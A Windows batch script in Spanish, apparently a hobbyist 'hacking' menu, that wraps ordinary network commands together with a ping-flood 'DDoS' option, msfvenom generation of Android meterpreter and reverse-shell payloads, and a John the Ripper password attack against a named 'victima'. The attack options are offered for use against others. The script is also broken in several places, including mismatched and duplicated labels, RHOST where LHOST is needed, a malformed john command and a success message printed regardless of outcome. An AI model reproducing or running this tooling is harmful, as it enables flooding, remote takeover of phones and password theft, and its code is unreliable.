@echo off
:menu
cls
color F0
title Hack Dns By DNSgroup
echo.
ECHO Bienvenido al dns %USERNAME% estamos para ayudar
echo.
ECHO Y ahora que deseas hacer?
ECHO ======================================================
ECHO 1. Nslookup
ECHO 2. Ping a una pag web
ECHO 3. DDoS
ECHO 4. ARP
ECHO 5. tabla de enroutamiento
ECHO 6. servicio de gestion de red
ECHO 7. iniciar trasado de red
ECHO 8. mas informacion
ECHO A partir de aqui debes tener algunas herramients descargadas
ECHO 9. crear meterpreter metasploit para android
ECHO 10. fuerza bruta
ECHO 00. salir
ECHO ======================================================
ECHO.
SET /P choice=Que deseas hacer?
if %choice%==1 goto Nslookup
if %choice%==2 goto Ping
if %choice%==3 goto DDoS
if %choice%==4 goto arp
if %choice%==5 goto route
if %choice%==6 goto netstat
if %choice%==7 goto tracert
if %choice%==8 goto mas 
if %choice%==9 goto metsploit
if %choice%==10 goto bruta
if %choice%==00 goto salir
:Nslookup
ECHO INICINDO LOS SERVICIOS
echo.
SET /P var=CUAL ES LA IP/URL PARA EL ANALIZAR?
nslookup %var%
pause
exit

:Ping
ECHO INICINDO LOS SERVICIOS
echo.
SET /P var=CUAL ES LA IP/URL PARA EL ANALIZAR?
ping %var%
pause
exit
:DDoS
ECHO INICINDO LOS SERVICIOS
echo.
SET /P var=CUAL ES LA IP/URL PARA EL ANALIZAR?
SET /P var2=Cual es el tamaño del ataque?
ping %var% -t -l %var2%
pause
exit
:arp
ECHO iniciando servicios de arp
ECHO ANALIZANDO ARP
arp -a
pause
exit

:route
ECHO INICIANDO TABLA DE ENROUTAMIENTO
SET /P var=En este momento, deseas cambiar tu ip?(S/N)
if %var%==S goto 1
if %var%==s goto 1
if %var%==N goto 2
if %var%==n goto 2

:1
ipconfig /release
ipconfig /renew 
route print
pause
exit

:2
route print
pause
exit

:netstat
ECHO INICIANDO LA REVISION DE RED TIPO NETSTAT
netstat -an
pause
exit

:tracert
ECHO INICIANDO SERVICIO
SET /P var=CUAL ES LA IP/URL QUE TRASAREMOS?
tracert %var%
pause
exit

:mas
ECHO SI QUIERES LA DOCUMENTACION COMPLETA VE A LA PROXIMA URL:
ECHO https://github.com/DNSGroup/hack-cmd

:metasploit
ECHO 1. ANDROID
ECHO 2. LINUX
ECHO 3. WINDOWS
SET /P var=Cual plataforma elijes?
if %var%==1 goto android
if %var%==2 goto linux
if %var%==3 goto windows

:android
ECHO Buena eleccion, empezaremos con la eleccion del meterpreter
ECHO 1. android/meterpreter/reverse_tcp
ECHO 2. android/meterpreter/reverse_http
ECHO 3. android/meterpreter/reverse_https
ECHO 4. android/shell/reverse_tcp
ECHO 5. android/shell/reverse_https
ECHO 6. android/shell/reverse_http

SET /P var=:ANDROID/SELECT/
if %var%==1 goto tcp
if %var%==2 goto http
if %var%==3 goto https
if %var%==4 goto tcps
if %var%==5 goto httpssh
if %var%==6 goto httpsh
#debes terminar la zona de android
:tcp
SET /P var=En que direccion lo guardaras?
msfvenom -p android/meterpreter/reverse_tcp RHOST=255.255.255.255 RPORT=4444 R > %var%
ECHO listo tu payload ha sido cargado en %var%
pause
exit
:http
SET /P var=En que direccion lo guardaras?
msfvenom -p android/meterpreter/reverse_http RHOST=255.255.255.255 RPORT=4444 R > %var%
ECHO listo tu payload ha sido cargado en %var%
pause
exit

:https
SET /P var=En que direccion lo guardaras?
msfvenom -p android/meterpreter/reverse_https RHOST=255.255.255.255 RPORT=4444 R > %var%
ECHO listo tu payload ha sido cargado en %var%
pause
exit

:tcps
SET /P var=En que direccion lo guardaras? 
msfvenom -p android/shell/reverse_tcp RHOST=255.255.255.255 RPORT=4444 R > %var%
ECHO listo tu payload ha sido cargado en %var%
pause
exit

:httpssh
SET /P var=En que direccion lo guardaras? 
msfvenom -p android/shell/reverse_https RHOST=255.255.255.255 RPORT=4444 R > %var%
ECHO listo tu payload ha sido cargado en %var%
pause
exit

:httpsh
SET /P var=En que direccion lo guardaras? 
msfvenom -p android/shell/reverse_http RHOST=255.255.255.255 RPORT=4444 R > %var%
ECHO listo tu payload ha sido cargado en %var%
pause
exit

:bruta
SET /P varx=Tienes john(S/N)
if %varx%==S goto 1
if %varx%==s goto 1
if %varx%==N goto 2
if %varx%==n goto 2

:1
SET /P john=Cual es la version de tu john?(ej. jhon123.exe)
SET /P pass=Cual es la direccion de tu diccionario?
SET /P victima=Cual es tu victima?
%john% -o %pass% /%victima%
ECHO El ataque fue realizado con exito
pause
exit

:2
ECHO si no tienes john usa este enlce https://www.usitility.com/es/john-the-ripper/descargar-windows-10
pause
exit

:salir
ECHO EL EQUIPO DE DNSGroup te agradece mucho, hasta la proxima %USERNAME%
pause
exit
